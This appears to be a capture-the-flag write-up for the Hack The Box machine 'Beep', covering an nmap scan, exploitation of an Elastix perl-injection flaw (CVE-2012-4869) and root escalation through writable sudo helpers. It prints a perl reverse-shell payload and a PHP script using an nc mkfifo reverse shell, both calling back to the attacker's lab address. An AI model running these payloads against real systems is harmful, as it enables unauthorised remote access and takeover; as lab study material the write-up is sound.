# beep-htb

## nmap
Firstly I ran nmap as: `nmap 10.129.157.253 -sC -sV`

Output:
<pre>
  ```nmap
  PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.129.157.253/
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            853/udp   status
|_  100024  1            856/tcp   status
143/tcp   open  imap?
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2025-11-24T12:40:17+00:00; +4s from scanner time.
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Host: 127.0.0.1

Host script results:
|_clock-skew: 3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 576.12 seconds


  ```
</pre>
only ports that seem useful are 443 and 10000, as http is always a good place to start, port 80 just directs you to 443.

Opening the website at https://10.129.157.253/, it displays a login panel of an Elastix application.

Using `searchsploit elastic` outputs a few usable exploits. CVE-2012-4869 is useable as an unauthenticated remote attacker, it's a perl injection via a double URL encoded CRLF newline character.
It's endpoint is at /misc/callme.php?action=c&callmenum=<inject>

Through this, you can run perl code, a public exploit uses 
<pre>```perl
"'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"' str("10.10.14.218") ':' str(443) '");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'" to 
```</pre>
So I went with that.

## Privilege escalation to root
Running `sudo -l` will display all the comamands the asterisk user can run as other users.
Output:
<pre>
  ```bash
  Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
  ```
</pre>

I used `sudo chmod a+x /usr/sbin/elastix-helper`, rewrote elastix-helper to send me a reverse shell as
<pre>
  ```php
  #!/usr/bin/php
  <?php
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.218 9003 >/tmp/f");

?>

  ```
</pre>

This got me root.
